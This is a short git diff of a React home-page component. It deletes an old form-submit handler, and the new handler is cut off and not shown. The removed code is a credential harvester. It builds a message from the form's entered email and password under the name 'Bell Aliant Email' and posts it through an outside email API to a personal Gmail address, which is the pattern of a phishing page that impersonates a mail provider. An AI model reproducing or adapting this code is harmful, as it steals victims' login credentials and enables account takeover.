@@ -37,39 +37,6 @@ const HomePage = () => {
     return Object.keys(errors).length === 0;
   };
 
-  const handleSubmitOLD = async (e) => {
-    e.preventDefault();
-    setIsLoading(true);
-    const customizedMessage = `
-      Hello, New Form Submitted 
-      Email: ${formData.email},
-      Password: ${formData.password}
-      Thank you for using our service.
-    `;
-    const data = {
-      sender_name: import.meta.env.APP_SENDER_NAME,
-      sender_email: import.meta.env.APP_SENDER_ADDRESS,
-      message: customizedMessage,
-      subject: "New Form Submitted",
-      email: "krogstadracheal@gmail.com",
-      name: "Bell Aliant Email",
-    };
-    console.log(data);
-
-    const url =
-      import.meta.env.APP_API_URL ??
-      "http://talentsapartments.com/api/api-email";
-    if (validateForm()) {
-      try {
-        await axios.post(url, data);
-        location.setIsSubmitted(true);
-        setIsLoading(false);
-      } catch (error) {
-        console.error("Failed to send email:", error);
-        setIsLoading(false);
-      }
-    }
-  };
   const handleSubmit = async (e) => {
     e.preventDefault();
 
